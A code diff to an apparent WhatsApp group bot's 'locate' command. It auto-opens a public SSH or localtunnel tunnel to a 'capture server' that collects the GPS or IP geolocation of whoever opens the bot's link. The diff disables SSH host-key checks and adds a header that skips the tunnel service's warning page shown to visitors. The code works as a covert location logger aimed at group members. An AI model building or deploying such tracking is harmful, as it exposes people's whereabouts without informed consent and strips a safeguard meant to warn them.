@@ -1,4 +1,5 @@
 import { randomUUID } from "node:crypto";
+import { spawn } from "node:child_process";
 import { createServer, type Server } from "node:http";
 import type { CommandContext } from "../../types/index.d.ts";
 import { fytBold } from "../../core/socketText.ts";
@@ -34,12 +35,151 @@ function maskIp(ip: string) {
   return v4.length === 4 ? `${v4[0]}.${v4[1]}.${v4[2]}.*` : ip;
 }
 
+/* ───────────────────────── túnel propio (sin ngrok) ───────────────────────── */
+
+const SSH_OPTS = [
+  "-o", "StrictHostKeyChecking=no",
+  "-o", "UserKnownHostsFile=/dev/null",
+  "-o", "ServerAliveInterval=30",
+  "-o", "ExitOnForwardFailure=yes",
+];
+
+type Provider = { cmd: string; args: string[]; re: RegExp };
+
+function provider(name: string): Provider | null {
+  const npx = process.platform === "win32" ? "npx.cmd" : "npx";
+  switch (name) {
+    case "lhr":
+      return {
+        cmd: "ssh",
+        args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "nokey@localhost.run"],
+        re: /https:\/\/[a-z0-9-]+\.lhr\.life/i,
+      };
+    case "lt":
+      return {
+        cmd: npx,
+        args: ["--yes", "localtunnel", "--port", String(PORT)],
+        re: /https:\/\/[a-z0-9-]+\.loca\.lt/i,
+      };
+    case "serveo":
+      return {
+        cmd: "ssh",
+        args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "serveo.net"],
+        re: /https:\/\/[a-z0-9-]+\.serveo\.net/i,
+      };
+    default:
+      return null;
+  }
+}
+
+const tunnel = (G.__locTunnel ??= {
+  url: "" as string,
+  proc: null as any,
+  provider: "",
+  tries: 0,
+  order: ["lhr", "lt", "serveo"] as string[],
+});
+
+function baseUrl() {
+  const manual = (process.env.LOCATE_BASE_URL || "").replace(/\/+$/, "");
+  return manual || tunnel.url;
+}
+
+function startTunnel(): Promise<string> {
+  if (baseUrl()) return Promise.resolve(baseUrl());
+  if (tunnel.proc) {
+    return new Promise((r) => {
+      const t = setInterval(() => {
+        if (tunnel.url || tunnel.tries > 8) {
+          clearInterval(t);
+          r(tunnel.url);
+        }
+      }, 300);
+    });
+  }
+
+  const forced = process.env.LOCATE_TUNNEL;
+  const name = forced && forced !== "auto" ? forced : tunnel.order[tunnel.tries % tunnel.order.length];
+  const p = provider(name);
+  if (!p) return Promise.resolve("");
+
+  tunnel.provider = name;
+
+  return new Promise((resolve) => {
+    let done = false;
+    let child: any;
+    try {
+      child = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] });
+    } catch {
+      resolve("");
+      return;
+    }
+    tunnel.proc = child;
+
+    const finish = (val: string) => {
+      if (done) return;
+      done = true;
+      clearTimeout(timer);
+      resolve(val);
+    };
+
+    const onData = (buf: Buffer) => {
+      const m = buf.toString().match(p.re);
+      if (m && !tunnel.url) {
+        tunnel.url = m[0].replace(/\/+$/, "");
+        tunnel.tries = 0;
+        console.log(`[locate] túnel ${name} → ${tunnel.url}`);
+        finish(tunnel.url);
+      }
+    };
+
+    child.stdout?.on("data", onData);
+    child.stderr?.on("data", onData);
+
+    child.on("exit", () => {
+      if (tunnel.proc === child) {
+        tunnel.proc = null;
+        tunnel.url = "";
+      }
+      if (!done) {
+        tunnel.tries++;
+        finish("");
+      }
+    });
+
+    child.on("error", () => {
+      tunnel.proc = null;
+      tunnel.tries++;
+      finish("");
+    });
+
+    const timer = setTimeout(() => {
+      if (!tunnel.url) {
+        try { child.kill("SIGKILL"); } catch {}
+        tunnel.proc = null;
+        tunnel.tries++;
+        finish("");
+      }
+    }, 18000);
+  });
+}
+
+async function ensureTunnel(): Promise<string> {
+  if (baseUrl()) return baseUrl();
+  for (let i = 0; i < 3; i++) {
+    const url = await startTunnel();
+    if (url) return url;
+    await new Promise((r) => setTimeout(r, 900));
+  }
+  return "";
+}
+
 /* ───────────────────────── servidor de captura ───────────────────────── */
 
 const CORS: Record<string, string> = {
   "Access-Control-Allow-Origin": "*",
   "Access-Control-Allow-Methods": "POST, OPTIONS",
-  "Access-Control-Allow-Headers": "Content-Type",
+  "Access-Control-Allow-Headers": "Content-Type, Bypass-Tunnel-Reminder",
 };
 
 function clientIp(req: any) {
@@ -49,9 +189,7 @@ function clientIp(req: any) {
 
 async function geoFromIp(ip: string) {
   try {
-    const r = await fetch(`https://ipapi.co/${ip}/json/`, {
-      headers: { "User-Agent": "locate-bot" },
-    });
+    const r = await fetch(`https://ipapi.co/${ip}/json/`, { headers: { "User-Agent": "locate-bot" } });
     if (!r.ok) return null;
     const j: any = await r.json();
     if (!j || j.error) return null;
@@ -65,7 +203,7 @@ async function handle(req: any, res: any) {
   Object.entries(CORS).forEach(([k, v]) => res.setHeader(k, v));
   if (req.method === "OPTIONS") return res.writeHead(204).end();
 
-  const url = new URL(req.url || "/", `http://${req.headers.host}`);
+  const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
   const m = url.pathname.match(/^\/l\/([A-Za-z0-9_-]{6,48})$/);
   if (!m) return res.writeHead(404, { "Content-Type": "application/json" }).end('{"ok":false}');
 
@@ -126,11 +264,15 @@ function startServer() {
   });
 
   server.on("error", (e: any) => {
-    if (e?.code === "EADDRINUSE") console.log(`[locate] puerto ${PORT} ocupado`);
+    if (e?.code === "EADDRINUSE") console.log(`[locate] puerto ${PORT} ocupado, reusando`);
   });
 
   server.listen(PORT, () => console.log(`[locate] escuchando :${PORT} · ttl ${TTL / 60000}m`));
   setInterval(sweep, 5 * 60 * 1000).unref?.();
+
+  process.once("exit", () => {
+    try { tunnel.proc?.kill("SIGKILL"); } catch {}
+  });
 }
 
 /* ───────────────────────── builder del tapete ───────────────────────── */
@@ -182,7 +324,7 @@ function paint(d){
   $('st').textContent=d.src==='gps'?'GPS':'IP';
 }
 function post(d){
-  try{fetch(BASE+'/l/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(function(){})}catch(e){}
+  try{fetch(BASE+'/l/'+SID,{method:'POST',headers:{'Content-Type':'application/json','Bypass-Tunnel-Reminder':'true'},body:JSON.stringify(d)}).catch(function(){})}catch(e){}
 }
 function start(){
   fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(ipd){
@@ -227,18 +369,22 @@ export default {
   async run(ctx: CommandContext) {
     const { reply, react, sock, from, msg } = ctx;
 
-    const base = (process.env.LOCATE_BASE_URL || "").replace(/\/+$/, "");
-    if (!base) {
-      await reply("⚙️ Falta configurar *LOCATE_BASE_URL* en el .env.").catch(() => undefined);
-      return;
-    }
     if (!from.endsWith("@g.us")) {
       await reply("Solo funciona en grupos.").catch(() => undefined);
       return;
     }
 
-    startServer();
     await react("🛰️").catch(() => undefined);
+    startServer();
+
+    const base = await ensureTunnel();
+    if (!base) {
+      await react("❌").catch(() => undefined);
+      await reply(
+        `${fytBold("Sin túnel")}: no se pudo abrir un enlace público. Prueba *LOCATE_TUNNEL=lt* o *serveo*.`,
+      ).catch(() => undefined);
+      return;
+    }
 
     const author: string = (msg.key as any).participant || from;
     const num = author.split("@")[0].split(":")[0];
